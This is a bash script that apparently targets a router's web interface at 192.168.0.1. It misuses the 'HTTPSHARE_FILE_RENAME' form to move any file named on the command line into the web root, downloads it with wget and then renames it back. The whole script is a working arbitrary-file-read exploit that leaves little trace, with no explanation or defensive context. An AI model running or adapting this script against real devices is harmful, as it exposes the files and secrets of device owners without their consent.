#!/bin/bash

if [ -z "$1" ]; then
    echo "No file to download"
    exit 1
fi
OUT="files$1"
mkdir -p $(dirname $OUT)

echo "GET $1 as $OUT"
# Move file to web root directory
if curl -qs 'http://192.168.0.1/goform/goform_set_cmd_process' \
--data-urlencode 'isTest=false' \
--data-urlencode 'goformId=HTTPSHARE_FILE_RENAME' \
--data-urlencode 'path_SD_CARD=/' \
--data-urlencode "OLD_NAME_SD_CARD=$1" \
--data-urlencode "NEW_NAME_SD_CARD=/web/file.bin" | grep "failure"; then
exit 1
fi
echo ""
# Download it

wget http://192.168.0.1/file.bin -O "$OUT"

# Restore
curl -qs 'http://192.168.0.1/goform/goform_set_cmd_process' \
--data-urlencode 'isTest=false' \
--data-urlencode 'goformId=HTTPSHARE_FILE_RENAME' \
--data-urlencode 'path_SD_CARD=/' \
--data-urlencode "OLD_NAME_SD_CARD=/web/file.bin" \
--data-urlencode "NEW_NAME_SD_CARD=$1"
echo ""